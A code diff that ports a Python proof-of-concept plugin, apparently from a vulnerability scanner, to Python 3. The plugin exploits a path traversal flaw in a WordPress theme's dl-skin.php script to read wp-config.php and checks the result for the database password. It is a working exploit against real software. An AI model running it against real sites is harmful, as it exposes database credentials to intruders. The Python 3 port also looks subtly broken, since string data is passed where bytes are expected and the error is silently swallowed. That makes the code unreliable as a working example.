@@ -15,7 +15,7 @@ EXPLOIT
 
 """
 
-import urllib2
+import urllib.request, urllib.error, urllib.parse
 from plugin.urlparser import get_domain
 
 
@@ -25,7 +25,7 @@ def poc(url):
     payload = '/wp-content/themes/bonkersbeat/lib/scripts/dl-skin.php'
     target = get_domain(url).rstrip('/') + payload
     try:
-        r = urllib2.urlopen(target, data="_mysite_download_skin=../../../../../wp-config.php", timeout=5).read()
+        r = urllib.request.urlopen(target, data="_mysite_download_skin=../../../../../wp-config.php", timeout=5).read()
         if "define('DB_PASSWORD'" in r and '@package WordPress' in r:
             return target
     except Exception:
